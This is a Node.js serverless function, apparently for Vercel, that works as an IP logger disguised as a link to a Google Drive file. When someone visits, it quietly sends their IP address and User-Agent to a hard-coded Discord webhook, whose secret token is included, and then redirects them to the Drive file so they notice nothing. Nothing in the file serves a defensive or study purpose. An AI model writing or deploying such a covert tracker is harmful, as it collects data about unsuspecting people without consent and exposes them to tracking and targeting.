const fetch = require('node-fetch');

module.exports = async (req, res) => {
  // Get visitor IP (handles Vercel proxy)
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  
  // Prepare Discord webhook data
  const webhookURL = 'https://discord.com/api/webhooks/1346201636246388856/IU6P9NLHsun4Mkln7NabkTOxX7RqL6_56tYXspYdbdRtyeIT0-uuDaUqiXgs7SdLRlIW';
  const embed = {
    title: 'New Visitor',
    description: `IP: ${ip}\nUser-Agent: ${req.headers['user-agent']}`,
    timestamp: new Date().toISOString()
  };
  
  // Send to Discord (don't await to make redirect faster)
  fetch(webhookURL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ embeds: [embed] })
  }).catch(console.error);
  
  // Redirect to Google Drive
  res.redirect(301, 'https://drive.google.com/file/d/1pEFnnPyHl0ug_rD9WtfYKcoy3u3EjJBX/view');
};
